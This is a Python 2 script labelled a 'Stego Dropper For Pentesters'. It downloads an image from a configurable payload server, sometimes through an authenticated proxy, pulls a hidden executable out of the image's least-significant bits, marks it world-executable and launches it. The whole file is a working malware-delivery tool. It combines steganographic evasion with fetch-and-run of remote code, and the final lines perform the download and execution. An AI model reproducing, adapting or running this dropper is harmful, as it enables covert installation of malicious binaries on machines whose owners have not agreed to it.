#!/usr/bin/python
# Stego Dropper For Pentesters v0.1
# Heavily uses parts from https://github.com/RobinDavid/LSB-Steganography

import urllib
import urllib2
import httplib
import subprocess
import sys
import base64
import os
import string
import cv2.cv as cv

# Set your payload server address
HOST = "localhost" # sys.argv[1]
# Set your webserver port address
PORT = "80" # sys.argv[2]
# Set your stego'd file path
IMG = "mal.png"
# Set the name of your payload to drop
PAYLOAD = "mal_exe"
# TURN THIS ON IF YOU WANT PROXY SUPPORT
PROXY_SUPPORT = "OFF"
# THIS WILL BE THE PROXY URL
PROXY_URL = "http://proxyinfo:80"
# USERNAME FOR THE PROXY
USERNAME = "username"
# PASSWORD FOR THE PROXY
PASSWORD = "password"

class SteganographyException(Exception):
    pass

class LSBSteg():
    def __init__(self, im):
        self.image = im
        self.width = im.width
        self.height = im.height
        self.size = self.width * self.height
        self.nbchannels = im.channels
        self.maskONEValues = [1,2,4,8,16,32,64,128]
        #Mask used to put one ex:1->00000001, 2->00000010 .. associated with OR bitwise
        self.maskONE = self.maskONEValues.pop(0) #Will be used to do bitwise operations
        self.maskZEROValues = [254,253,251,247,239,223,191,127]
        #Mak used to put zero ex:254->11111110, 253->11111101 .. associated with AND bitwise
        self.maskZERO = self.maskZEROValues.pop(0)
        self.curwidth = 0 #Current width position
        self.curheight = 0 #Current height position
        self.curchan = 0 #Current channel position
     
    def saveImage(self,filename):
    # Save the image using the given filename
        cv.SaveImage(filename, self.image)

    def putBinaryValue(self, bits): #Put the bits in the image
        for c in bits:
            val = list(self.image[self.curwidth,self.curheight]) #Get the pixel value as a list
            if int(c) == 1:
                val[self.curchan] = int(val[self.curchan]) | self.maskONE #OR with maskONE
            else:
                val[self.curchan] = int(val[self.curchan]) & self.maskZERO #AND with maskZERO
                
            self.image[self.curwidth,self.curheight] = tuple(val)
            self.nextSpace() #Move "cursor" to the next space
        
    def nextSpace(self):#Move to the next slot were information can be taken or put
        if self.curchan == self.nbchannels-1: #Next Space is the following channel
            self.curchan = 0
            if self.curwidth == self.width-1: #Or the first channel of the next pixel of the same line
                self.curwidth = 0
                if self.curheight == self.height-1:#Or the first channel of the first pixel of the next line
                    self.curheight = 0
                    if self.maskONE == 128: #Mask 1000000, so the last mask
                        raise SteganographyException, "Image filled"
                    else: #Or instead of using the first bit start using the second and so on..
                        self.maskONE = self.maskONEValues.pop(0)
                        self.maskZERO = self.maskZEROValues.pop(0)
                else:
                    self.curheight +=1
            else:
                self.curwidth +=1
        else:
            self.curchan +=1

    def readBit(self): #Read a single bit int the image
        val = self.image[self.curwidth,self.curheight][self.curchan]
        val = int(val) & self.maskONE
        self.nextSpace()
        if val > 0:
            return "1"
        else:
            return "0"
    
    def readByte(self):
        return self.readBits(8)
    
    def readBits(self, nb): #Read the given number of bits
        bits = ""
        for i in range(nb):
            bits += self.readBit()
        return bits

    def byteValue(self, val):
        return self.binValue(val, 8)
        
    def binValue(self, val, bitsize): #Return the binary value of an int as a byte
        binval = bin(val)[2:]
        if len(binval) > bitsize:
            raise SteganographyException, "binary value larger than the expected size"
        while len(binval) < bitsize:
            binval = "0"+binval
        return binval
    
    def unhideBin(self):
        l = int(self.readBits(64),2)
        output = ""
        for i in range(l):
            output += chr(int(self.readByte(),2))
        return output

# here is where we set all of our proxy settings
if PROXY_SUPPORT == "ON":
	auth_handler = urllib2.HTTPBasicAuthHandler()
	auth_handler.add_password(realm='RESTRICTED ACCESS',
                          	  uri=PROXY_URL, # PROXY SPECIFIED ABOVE
                              user=USERNAME, # USERNAME SPECIFIED ABOVE
                              passwd=PASSWORD) # PASSWORD SPECIFIED ABOVE
	opener = urllib2.build_opener(auth_handler)
	urllib2.install_opener(opener) 

#Grab our file file from the web server and save it to a file
req = urllib2.Request('http://%s:%s/%s' % (HOST,PORT,IMG))
message = urllib2.urlopen(req)
localFile = open('temp.png', 'w')
localFile.write(message.read())
localFile.close()

#Destego binary
inp = cv.LoadImage('temp.png')
steg = LSBSteg(inp)
bin = steg.unhideBin()
f = open(PAYLOAD,"wb") #Write the binary back to a file
f.write(bin)
f.close()
os.system('rm temp.png')

#set executable
os.chmod( PAYLOAD, 0777 )
#Launch the executable
os.system( './'+PAYLOAD )
